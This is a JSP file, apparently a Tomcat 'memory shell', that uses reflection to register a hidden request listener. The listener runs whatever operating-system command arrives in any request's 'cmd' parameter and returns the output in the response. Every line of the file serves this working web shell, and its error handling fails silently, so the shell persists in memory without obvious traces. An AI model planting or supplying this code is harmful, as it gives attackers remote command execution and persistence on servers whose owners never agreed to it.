<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Response" %>


<%!
    //定义listener
    public class ListenerDemo1 implements ServletRequestListener {
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();
                Field declaredField = request.getClass().getDeclaredField("request");
                declaredField.setAccessible(true);
                Request req = (Request) declaredField.get(request);
                Response response = req.getResponse();

                if (req.getParameter("cmd") != null) {
                    String resString = exec(req.getParameter("cmd"));
                    response.getWriter().println(resString);
                }
            }catch (Exception e){

            }
        }


        public void requestDestroyed(ServletRequestEvent sre) {

        }

        public String exec(String str) {
            try {
                String[] cmd = null;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    cmd = new String[]{"cmd.exe", "/c", str};
                } else {
                    cmd = new String[]{"/bin/sh", "-c", str};
                }
                if (cmd != null) {
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    String execresult = exec_result(inputStream);
                    return execresult;
                }
            } catch (Exception e) {

            }
            return "";
        }

        public String exec_result(InputStream inputStream) {
            try {
                byte[] bytes = new byte[1024];
                int len = 0;
                StringBuilder stringBuilder = new StringBuilder();
                while ((len = inputStream.read(bytes)) != -1) {
                    stringBuilder.append(new String(bytes, 0, len));
                }
                return stringBuilder.toString();
            } catch (Exception e) {
                return "";
            }
        }
    }
%>

<%
    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    Request req = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();

    ListenerDemo1 listenerDemo = new ListenerDemo1();
    standardContext.addApplicationEventListener(listenerDemo);
%>
